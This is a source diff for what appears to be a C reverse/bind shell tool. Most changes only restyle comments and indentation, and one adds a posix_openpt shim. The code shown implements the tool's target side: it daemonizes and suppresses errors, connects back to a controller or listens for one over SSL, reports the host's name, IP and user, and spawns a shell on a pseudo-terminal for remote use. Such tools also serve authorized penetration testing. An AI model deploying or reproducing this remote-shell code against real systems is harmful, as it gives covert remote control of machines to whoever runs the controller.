@@ -38,6 +38,17 @@
 #include "keys/dh_params_2048.c"
 
 
+
+/* 
+	 The man page for POSIX_OPENPT(3) states that for code that runs on older systems, you can define this yourself
+	 easily.
+ */
+int posix_openpt(int flags){
+	return open("/dev/ptmx", flags);
+}
+
+
+
 /***********************************************************************************************************************
  *
  * usage()
@@ -89,8 +100,8 @@ void usage(){
  **********************************************************************************************************************/
 int dummy_verify_callback(int preverify_ok, X509_STORE_CTX* ctx) {
 
-	// The point of a dummy function is that it's components won't be used. 
-	// We will nop reference them however to silence the noise from the compiler.
+	/*  The point of a dummy function is that it's components won't be used.  */
+	/*  We will nop reference them however to silence the noise from the compiler. */
 	preverify_ok += 0;
 	ctx += 0;
 
@@ -109,7 +120,7 @@ int dummy_verify_callback(int preverify_ok, X509_STORE_CTX* ctx) {
  * 
  ******************************************************************************/
 void catch_alarm(int signal){
-  exit(-signal);
+	exit(-signal);
 }
 
 
@@ -216,8 +227,8 @@ int main(int argc, char **argv){
 	 * Basic initialization.
 	 */
 
-	// Normally I would use the Gnu version. However, this tool needs to be more portable.
-	// Keeping the naming scheme, but setting it up myself.
+	/*  Normally I would use the Gnu version. However, this tool needs to be more portable. */
+	/*  Keeping the naming scheme, but setting it up myself. */
 	program_invocation_short_name = strrchr(argv[0], '/');
 	program_invocation_short_name++;
 
@@ -228,16 +239,16 @@ int main(int argc, char **argv){
 	while((opt = getopt(argc, argv, "pbkacs:d:f:r:ht:")) != -1){
 		switch(opt){
 
-			// plaintext
-			//
-			// The plaintext case is an undocumented "feature" which should be difficult to use.
-			// You will need to pass the -p switch from both ends in order for it to work.
-			// This is provided for debugging purposes only.
+			/*  plaintext */
+			/*  */
+			/*  The plaintext case is an undocumented "feature" which should be difficult to use. */
+			/*  You will need to pass the -p switch from both ends in order for it to work. */
+			/*  This is provided for debugging purposes only. */
 			case 'p':
 				io.encryption = PLAINTEXT;
 				break;
 
-			// bindshell
+				/*  bindshell */
 			case 'b':
 				bindshell = 1;
 				break;
@@ -271,15 +282,15 @@ int main(int argc, char **argv){
 				break;
 
 			case 't':
-			errno = 0;
-			timeout = strtol(optarg, NULL, 10);
-			if(errno){
-				fprintf(stderr, "%s: %d: strtol(%s, NULL, 10): %s\r\n", \
-						program_invocation_short_name, io.controller, optarg, \
-						strerror(errno));
-				usage();
-			}
-			break;
+				errno = 0;
+				timeout = strtol(optarg, NULL, 10);
+				if(errno){
+					fprintf(stderr, "%s: %d: strtol(%s, NULL, 10): %s\r\n", \
+							program_invocation_short_name, io.controller, optarg, \
+							strerror(errno));
+					usage();
+				}
+				break;
 
 			case 'h':
 			default:
@@ -311,11 +322,11 @@ int main(int argc, char **argv){
 
 	buff_len = getpagesize();
 	if((buff_head = (char *) calloc(buff_len, sizeof(char))) == NULL){
-    fprintf(stderr, "%s: %d: calloc(%d, %d): %s\r\n", \
-        program_invocation_short_name, io.controller, \
+		fprintf(stderr, "%s: %d: calloc(%d, %d): %s\r\n", \
+				program_invocation_short_name, io.controller, \
 				buff_len, (int) sizeof(char), \
 				strerror(errno));
-    exit(-1);
+		exit(-1);
 	}
 
 	if((argc - optind) == 1){
@@ -331,7 +342,7 @@ int main(int argc, char **argv){
 	SSL_library_init();
 	SSL_load_error_strings();
 
-	// Prepare the retry timer values.
+	/*  Prepare the retry timer values. */
 	errno = 0;
 	retry_start = strtol(retry_string, &buff_ptr, 10);
 	if(errno){
@@ -354,8 +365,8 @@ int main(int argc, char **argv){
 		exit(-1);
 	}
 
-	// The joy of a struct with pointers to functions. We only call "io.remote_read()" and the
-	// appropriate crypto / no crypto version is called on the backend.
+	/*  The joy of a struct with pointers to functions. We only call "io.remote_read()" and the */
+	/*  appropriate crypto / no crypto version is called on the backend. */
 	if(io.encryption){
 
 		io.remote_read = &remote_read_encrypted;
@@ -417,7 +428,7 @@ int main(int argc, char **argv){
 	 */
 	if(io.controller){
 
-		// - Open a socket / setup SSL.
+		/*  - Open a socket / setup SSL. */
 		if(io.encryption == EDH){
 			if((controller_cert_path_head = (char *) calloc(PATH_MAX, sizeof(char))) == NULL){
 				fprintf(stderr, "%s: %d: calloc(%d, %d): %s\r\n", \
@@ -532,7 +543,7 @@ int main(int argc, char **argv){
 
 		if(bindshell){
 
-			// - Open a network connection back to the target.
+			/*  - Open a network connection back to the target. */
 			if((io.connect = BIO_new_connect(buff_head)) == NULL){
 				fprintf(stderr, "%s: %d: BIO_new_connect(%s): %s\n", \
 						program_invocation_short_name, io.controller, buff_head, strerror(errno));
@@ -545,8 +556,8 @@ int main(int argc, char **argv){
 
 			while(((retval = BIO_do_connect(io.connect)) != 1) && retry_start){
 
-				// Using RAND_pseudo_bytes() instead of RAND_bytes() because this is a best effort. We don't
-				// actually want to die or print an error if there is a lack of entropy.
+				/*  Using RAND_pseudo_bytes() instead of RAND_bytes() because this is a best effort. We don't */
+				/*  actually want to die or print an error if there is a lack of entropy. */
 				if(retry_stop){
 					RAND_pseudo_bytes((unsigned char *) &tmp_uint, sizeof(tmp_uint));
 					retry = retry_start + (tmp_uint % (retry_stop - retry_start));
@@ -569,7 +580,7 @@ int main(int argc, char **argv){
 			}
 
 		}else{
-			// - Listen for a connection.
+			/*  - Listen for a connection. */
 			printf("Listening on %s...", buff_head);
 			fflush(stdout);
 
@@ -751,7 +762,7 @@ int main(int argc, char **argv){
 
 		printf("Initializing...");
 
-		// - Send initial shell data.
+		/*  - Send initial shell data. */
 		memset(buff_head, 0, buff_len);
 		buff_tail = buff_head;
 		*(buff_tail++) = (char) APC;
@@ -786,7 +797,7 @@ int main(int argc, char **argv){
 			exit(-1);
 		}
 
-		// - Send initial environment data.
+		/*  - Send initial environment data. */
 		tmp_len = strlen(DEFAULT_ENV);
 		if((env_string = (char *) calloc(tmp_len + 1, sizeof(char))) == NULL){
 			print_error(&io, "%s: %d: calloc(strlen(%d, %d)): %s\n", \
@@ -861,7 +872,7 @@ int main(int argc, char **argv){
 		}
 
 
-		// - Send initial termios data.
+		/*  - Send initial termios data. */
 		if((retval = ioctl(STDIN_FILENO, TIOCGWINSZ, &tty_winsize)) == -1){
 			print_error(&io, "%s: %d: ioctl(STDIN_FILENO, TIOCGWINSZ, %lx): %s\n", \
 					program_invocation_short_name, io.controller, \
@@ -899,7 +910,7 @@ int main(int argc, char **argv){
 			exit(-1);
 		}
 
-		// - Set local terminal to raw. 
+		/*  - Set local terminal to raw.  */
 		if((retval = tcgetattr(STDIN_FILENO, &saved_termios_attrs)) == -1){
 			print_error(&io, "%s: %d: tcgetattr(STDIN_FILENO, %lx): %s\n", \
 					program_invocation_short_name, io.controller, \
@@ -929,7 +940,7 @@ int main(int argc, char **argv){
 
 		io.local_fd = STDIN_FILENO;
 
-		// - Send the commands in the rc file.
+		/*  - Send the commands in the rc file. */
 
 		if((rc_fd = open(rc_file_exp.we_wordv[0], O_RDONLY)) != -1){
 
@@ -962,7 +973,7 @@ int main(int argc, char **argv){
 
 		errno = 0;
 
-		// - Enter broker() for data brokering.
+		/*  - Enter broker() for data brokering. */
 		if((retval = broker(&io) == -1)){
 			print_error(&io, "%s: %d: broker(%lx): %s\r\n", \
 					program_invocation_short_name, io.controller, (unsigned long) &io,
@@ -974,10 +985,10 @@ int main(int argc, char **argv){
 			err_flag = errno;
 		}
 
-		// - Reset local term.
+		/*  - Reset local term. */
 		tcsetattr(STDIN_FILENO, TCSANOW, &saved_termios_attrs);
 
-		// - Exit.
+		/*  - Exit. */
 		if(!err_flag){
 			printf("Good-bye!\n");
 
@@ -1017,14 +1028,14 @@ int main(int argc, char **argv){
 		 */
 	}else{
 
-		// Note: We will make heavy use of #ifdef DEBUG here. I don't want to *ever* print to the
-		// remote host. We can do so if debugging, but otherwise just fail silently. Once the 
-		// connection is open, we will try to shove errors down the socket, but otherwise fail
-		// silently.
+		/*  Note: We will make heavy use of #ifdef DEBUG here. I don't want to *ever* print to the */
+		/*  remote host. We can do so if debugging, but otherwise just fail silently. Once the  */
+		/*  connection is open, we will try to shove errors down the socket, but otherwise fail */
+		/*  silently. */
 
 #ifndef DEBUG
 
-		// - Become a daemon.
+		/*  - Become a daemon. */
 		umask(0);
 
 		retval = fork();
@@ -1046,7 +1057,7 @@ int main(int argc, char **argv){
 
 #endif
 
-		// - Setup SSL.
+		/*  - Setup SSL. */
 		if(io.encryption){
 
 			if((io.ctx = SSL_CTX_new(TLSv1_client_method())) == NULL){
@@ -1058,9 +1069,9 @@ int main(int argc, char **argv){
 				exit(-1);
 			}
 
-			// Because the controller host will normally dictate which crypto to use, in bind shell mode
-			// we will want to restrict this to only EDH from the target host. Otherwise the bind shell may
-			// serve a shell to any random hacker that knows how to port scan.
+			/*  Because the controller host will normally dictate which crypto to use, in bind shell mode */
+			/*  we will want to restrict this to only EDH from the target host. Otherwise the bind shell may */
+			/*  serve a shell to any random hacker that knows how to port scan. */
 			if(bindshell){
 				cipher_list = CONTROLLER_CIPHER;
 			}else{
@@ -1120,7 +1131,7 @@ int main(int argc, char **argv){
 		alarm(timeout);
 
 		if(bindshell){
-			// - Listen for a connection.
+			/*  - Listen for a connection. */
 
 			if(keepalive){
 				if(signal(SIGCHLD, SIG_IGN) == SIG_ERR){
@@ -1217,7 +1228,7 @@ int main(int argc, char **argv){
 
 		}else{
 
-			// - Open a network connection back to a controller.
+			/*  - Open a network connection back to a controller. */
 			if((io.connect = BIO_new_connect(buff_head)) == NULL){
 #ifdef DEBUG
 				fprintf(stderr, "%s: %d: BIO_new_connect(%s): %s\n", \
@@ -1234,8 +1245,8 @@ int main(int argc, char **argv){
 #endif
 			while(((retval = BIO_do_connect(io.connect)) != 1) && retry_start){
 
-				// Using RAND_pseudo_bytes() instead of RAND_bytes() because this is a best effort. We don't
-				// actually want to die or print an error if there is a lack of entropy.
+				/*  Using RAND_pseudo_bytes() instead of RAND_bytes() because this is a best effort. We don't */
+				/*  actually want to die or print an error if there is a lack of entropy. */
 				if(retry_stop){
 					RAND_pseudo_bytes((unsigned char *) &tmp_uint, sizeof(tmp_uint));
 					retry = retry_start + (tmp_uint % (retry_stop - retry_start));
@@ -1374,7 +1385,7 @@ int main(int argc, char **argv){
 			}
 		}
 
-		// - Receive and set the shell.
+		/*  - Receive and set the shell. */
 		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
 			print_error(&io, "%s: %d: io.remote_read(%lx, %lx, %d): %s\r\n", \
 					program_invocation_short_name, io.controller, (unsigned long) &io, (unsigned long) &tmp_char, 1, strerror(errno));
@@ -1423,7 +1434,7 @@ int main(int argc, char **argv){
 		memcpy(shell, buff_head, tmp_len);
 
 
-		// - Receive and set the initial environment.
+		/*  - Receive and set the initial environment. */
 		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
 			print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
 					program_invocation_short_name, io.controller, \
@@ -1471,7 +1482,7 @@ int main(int argc, char **argv){
 			exit(-1);
 		}
 
-		// - Receive and set the initial termios.
+		/*  - Receive and set the initial termios. */
 		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
 			print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
 					program_invocation_short_name, io.controller, \
@@ -1549,7 +1560,7 @@ int main(int argc, char **argv){
 			exit(-1);
 		}
 
-		// - Create a pseudo-terminal (pty).
+		/*  - Create a pseudo-terminal (pty). */
 		if((pty_master = posix_openpt(O_RDWR|O_NOCTTY)) == -1){
 			print_error(&io, "%s: %d: posix_openpt(O_RDWR|O_NOCTTY): %s\r\n", \
 					program_invocation_short_name, io.controller, \
@@ -1592,7 +1603,7 @@ int main(int argc, char **argv){
 			exit(-1);
 		}
 
-		// - Send basic information back to the controller about the connecting host.
+		/*  - Send basic information back to the controller about the connecting host. */
 		memset(buff_head, 0, buff_len);
 		if((retval = gethostname(buff_head, buff_len - 1)) == -1){
 			print_error(&io, "%s: %d: gethostname(%lx, %d): %s\r\n", \
@@ -1606,7 +1617,7 @@ int main(int argc, char **argv){
 
 
 		remote_printf(&io, "# ip address: ");
-    if((retval = getsockname(io.remote_fd, &addr, &addrlen)) != -1){
+		if((retval = getsockname(io.remote_fd, &addr, &addrlen)) != -1){
 			memset(buff_head, 0, buff_len);
 			if(inet_ntop(addr.sa_family, addr.sa_data + 2, buff_head, buff_len - 1)){
 				remote_printf(&io, "%s", buff_head);
@@ -1618,8 +1629,8 @@ int main(int argc, char **argv){
 		}
 		remote_printf(&io, "\r\n");
 
-		// if the uid doesn't match an entry in /etc/passwd, we don't want to crash.
-		// Borrowed the "I have no name!" convention from bash.
+		/*  if the uid doesn't match an entry in /etc/passwd, we don't want to crash. */
+		/*  Borrowed the "I have no name!" convention from bash. */
 		passwd_entry = getpwuid(getuid());
 		remote_printf(&io, "# real user: ");
 		if(passwd_entry && passwd_entry->pw_name){
@@ -1666,7 +1677,7 @@ int main(int argc, char **argv){
 		}
 #endif
 
-		// - Fork a child to run the shell.
+		/*  - Fork a child to run the shell. */
 		retval = fork();
 
 		if(retval == -1){
@@ -1678,7 +1689,7 @@ int main(int argc, char **argv){
 
 		if(retval){
 
-			// - Parent: Enter the broker() and broker data.
+			/*  - Parent: Enter the broker() and broker data. */
 			if((retval = close(pty_slave)) == -1){
 				print_error(&io, "%s: %d: close(%d): %s\r\n", \
 						program_invocation_short_name, io.controller, \
@@ -1706,7 +1717,7 @@ int main(int argc, char **argv){
 			return(0);
 		}
 
-		// - Child: Initialize file descriptors.
+		/*  - Child: Initialize file descriptors. */
 		if((retval = close(pty_master)) == -1){
 			print_error(&io, "%s: %d: close(%d): %s\r\n", \
 					program_invocation_short_name, io.controller, \
@@ -1755,7 +1766,7 @@ int main(int argc, char **argv){
 			exit(-1);
 		} 
 
-		// - Child: Set the pty as controlling.
+		/*  - Child: Set the pty as controlling. */
 		if((retval = ioctl(STDIN_FILENO, TIOCSCTTY, 1)) == -1){
 			print_error(&io, "%s: %d: ioctl(STDIN_FILENO, TIOCSCTTY, 1): %s\r\n", \
 					program_invocation_short_name, io.controller, \
@@ -1763,7 +1774,7 @@ int main(int argc, char **argv){
 			exit(-1);
 		}
 
-		// - Child: Call execve() to invoke a shell.
+		/*  - Child: Call execve() to invoke a shell. */
 		errno = 0;
 		if((exec_argv = string_to_vector(shell)) == NULL){
 			print_error(&io, "%s: %d: string_to_vector(%s): %s\r\n", \
